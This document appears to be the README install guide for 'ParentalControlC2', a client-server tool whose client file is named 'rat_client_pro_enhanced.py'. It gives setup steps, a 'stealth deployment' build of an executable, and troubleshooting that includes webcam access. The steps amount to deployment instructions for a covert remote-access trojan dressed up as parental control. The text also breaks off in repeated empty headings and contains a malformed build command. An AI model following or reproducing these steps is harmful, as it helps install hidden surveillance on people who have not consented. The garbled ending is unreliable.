## ğŸš€ INSTALLATION GUIDE

### Prerequisites

- **Windows 10/11** (64-bit)
- **Python 3.8+**
- **MongoDB** (Local or Cloud)
- **Admin privileges** (for some features)

### Server Setup

```bash
# 1. Clone repository
cd ParentalControlC2/server

# 2. Install dependencies
pip install -r requirements_enhanced.txt

# 3. Configure MongoDB
# Edit config.py with your MongoDB URI
MONGODB_URI = "mongodb://localhost:27017/"

# 4. Run server
python app_enhanced.py

# Server will start at: http://localhost:5000
```

### Client Setup

```bash
# 1. Navigate to client directory
cd ParentalControlC2/client

# 2. Install dependencies
pip install -r requirements_client_enhanced.txt

# 3. Configure server IP
# The client will auto-discover the server on the network
# Or manually edit rat_client_pro_enhanced.py:
# Config.SERVER_IP = "192.168.1.100"

# 4. Run client
python rat_client_pro_enhanced.py

# For stealth deployment:
python build_exe.bat  # Creates executable
```

**Problem**: Client shows "Connection failed"

**Solutions**:
```bash
# 1. Check server is running
curl http://server-ip:5000/health

# 2. Check firewall
# Open port 5000 in Windows Firewall

# 3. Verify network connectivity
ping server-ip

# 4. Check client logs
tail -f client.log
```

### Webcam Not Working

**Problem**: "Webcam not detected"

**Solutions**:

**Solutions**:
